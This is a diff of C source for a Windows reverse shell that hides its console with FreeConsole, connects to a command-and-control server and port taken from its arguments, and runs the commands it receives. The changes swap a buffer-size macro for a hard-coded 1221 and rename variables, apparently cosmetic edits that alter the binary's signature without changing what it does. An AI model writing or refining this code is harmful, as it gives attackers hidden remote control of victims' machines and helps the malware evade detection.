@@ -2,7 +2,7 @@
 #include <windows.h>
 #include <ws2tcpip.h>
 #pragma comment(lib, "Ws2_32.lib")
-#define DEFAULT_BUFLEN 1024
+
 
 void RunShell(char* C2Server, int C2Port) {
     while(true) {
@@ -21,9 +21,9 @@ void RunShell(char* C2Server, int C2Port) {
             continue;
         }
         else {
-            char RecvData[DEFAULT_BUFLEN];
+            char RecvData[1221];
             memset(RecvData, 0, sizeof(RecvData));
-            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
+            int RecvCode = recv(mySocket, RecvData, 1221, 0);
             if (RecvCode <= 0) {
                 closesocket(mySocket);
                 WSACleanup();
@@ -43,7 +43,7 @@ void RunShell(char* C2Server, int C2Port) {
                 CloseHandle(pinfo.hThread);
 
                 memset(RecvData, 0, sizeof(RecvData));
-                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
+                int RecvCode = recv(mySocket, RecvData, 1221, 0);
                 if (RecvCode <= 0) {
                     closesocket(mySocket);
                     WSACleanup();
@@ -59,8 +59,8 @@ void RunShell(char* C2Server, int C2Port) {
 int main(int argc, char **argv) {
     FreeConsole();
     if (argc == 3) {
-        int port  = atoi(argv[2]);
-        RunShell(argv[1], port);
+        int pt  = atoi(argv[2]);
+        RunShell(argv[1], pt);
     }
     else {
 
